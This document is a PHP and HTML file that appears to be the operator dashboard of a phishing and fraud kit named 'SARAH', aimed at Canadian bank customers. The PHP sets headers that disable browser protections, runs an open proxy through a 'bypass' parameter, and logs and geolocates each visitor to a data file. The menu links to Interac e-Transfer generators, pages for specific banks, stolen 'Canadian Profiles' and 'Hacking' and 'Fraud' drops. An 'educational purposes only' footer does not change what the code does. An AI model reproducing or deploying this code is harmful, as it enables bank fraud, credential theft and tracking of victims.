<?php
include "/mods/antibot.php";

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS()
{
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }

    return $browser;
}

$user_os = getOS();
$user_browser = getBrowser();

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file = 'data.dat';
$file1 = 'combo.txt';
$file2 = 'master.log';
$ip = "" . $PublicIP;
$uaget = "" . $user_agent;
$bsr = "" . $user_browser;
$uos = "" . $user_os;
$ust = explode(" ", $user_agent);
$vr = $ust[3];
$ver = str_replace(")", "", $vr);
$version = "Version              : " . $ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
} else {
    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
    $tp = $details['type'];
    $cn = $details['country_phone'];
    $is = $details['isp'];
    $la = $details['latitude'];
    $lp = $details['longitude'];
    $crn = $details['currency'];
    $type = $tp;
    $isp = $is;
    $bank = "INTERACT WITH YOUR NEIGBORS![OPEN]";
    $LL = "+";
    $currency = "" . $full_date;
    $lh = "|";
    $li = ",";
}


?><html><head>
  <title>SARAH</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background-color: #1a1a1a;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }

    header {
      background-color: #333333;
      padding: 20px;
      text-align: center;
      color: white;
    }

    h1 {
      font-size: 24px;
      margin: 0;
    }

    .container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .menu-icon {
      position: absolute;
      top: 20px;
      left: 20px;
      color: white;
      font-size: 24px;
      cursor: pointer;
    }

    .menu {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.8);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 999;
    }

    .menu ul {
      list-style-type: none;
      padding: 0;
      margin: 0;
    }

    .menu ul li {
      margin-bottom: 10px;
    }

    .menu ul li a {
      color: white;
      text-decoration: none;
      font-size: 18px;
    }

    .footer {
      background-color: #333333;
      padding: 20px;
      text-align: center;
      color: white;
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
    }

    .widget {
      width: 200px;
      height: 50px;
      background-color: #555555;
      margin: 10px;
      border-radius: 10px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      transition: background-color 0.3s;
    }

    .widget img {
      width: 80px;
      height: 80px;
    }

    .widget p {
      font-size: 16px;
      color: white;
      margin: 10px 0;
      text-align: center;
    }

    .widget:hover {
      background-color: #777777;
      cursor: pointer;
    }

    .login-button {
      background-color: #007bff;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    .login-button:hover {
      background-color: #0056b3;
    }
  </style>
  <script>
    function toggleMenu() {
      var menu = document.getElementById("menu");
      menu.style.display = menu.style.display === "block" ? "none" : "block";
    }
  </script>
</head>
<body>
  <header>
    <span class="menu-icon" onclick="toggleMenu()">☰</span>
    <h1></h1>


  <script>
    function toggleMenu() {
      var menu = document.getElementById("menu");
      menu.style.display = menu.style.display === "block" ? "none" : "block";
    }
  </script>


  <header>
    <span class="menu-icon" onclick="toggleMenu()">☰</span><center><img src="/images/sarah-logo/4.png" width="50%"></center><a href="https://www.fontspace.com/category/stencil"></a><a href="https://www.fontspace.com/category/stencil"><img src="https://see.fontimg.com/api/renderfont4/Wy7PA/eyJyIjoiZnMiLCJoIjo2NCwidyI6MTAwMCwiZnMiOjY0LCJmZ2MiOiIjRDU1OTRBIiwiYmdjIjoiI0ZGRkZGRiIsInQiOjF9/U0FSQUg/kong-japanese.png" alt="Stencil fonts"></a><a href="https://www.fontspace.com/category/japanese"></a><a href="https://www.fontspace.com/category/japanese"></a>
  </header>

<div class="container">
  <div class="widget">
    <form action="Admin/Main.php" method="post">
      <button class="btn" type="submit">MOBILE WEBAPP</button>
    </form>

  </div>
  <div class="widget">
    <form action="admin/Main2.php" method="post">
      <button class="btn" type="submit">DESKTOP WEBAPP</button>
    </form>

  </div>
<div class="container">
  <div class="widget">
    <form action="/public/GO.php" method="post">
      <button class="btn" type="submit">GOOGLE LIVE LOCATION</button>
    </form>

  </div>
  <div class="widget">
    <form action="/public/deposit/manual.php" method="post">
      <button class="btn" type="submit">INTERAC ETRANSFER</button>
    </form>
</div>
</div>
  <div class="menu" id="menu">
    <ul>
      <li><a href="/admin/drop/hacking.php"> </a></li>
      <li><a href="/admin/drop/hacking.php">Hacking</a></li>
      <li><a href="/admin/drop/fraud.php">Fraud</a></li>
      <li><a href="/admin/drop/banks.php">Banks</a></li>
      <li><a href="/admin/drop/social.php">Social Media</a></li>
      <li><a href="/admin/drop/interac.php">Interac Request from</a></li>
      <li><a href="/admin/drop/maps.php">Google Map Generator</a></li>
      <li><a href="/admin/drop/drive.php">Google Drive Generator</a></li>
      <li><a href="/admin/drop/forest.php">Interac Generator</a></li>
      <li><a href="/admin/drop/telegram.php">Telegram Invite links</a></li>
      <li><a href="/admin/drop/profiles.php">Canadian Profiles</a></li>
      <li><a href="/admin/drop/pc.php">PC financial</a></li>
      <li><a href="/admin/drop/lauren.php">Laurentian Bank</a></li>
      <li><a href="/admin/drop/eq.php">eqbank</a></li>
      <li><a href="/admin/drop/pro_entry.php">PROFILE DATA ENTRY </a></li>
      <li><a href="/admin/drop/active.php">ACTIVE ACCOUNTS</a></li>
      <li><a href="/admin/drop/de-active.php">DEACTIVATE ACCOUNTS</a></li>
      <li><a href="/admin/drop/telhistory.php">TELEGRAM HITORY</a></li>
      <li><a href="/admin/drop/bank.php">BANK HISTORY</a></li> 
   </ul>
  </div>

  <footer class="footer">
    <p>© 2023 EDUCATIONAL PURPOSES ONLY</p>
  </footer>

</div></header></body></html>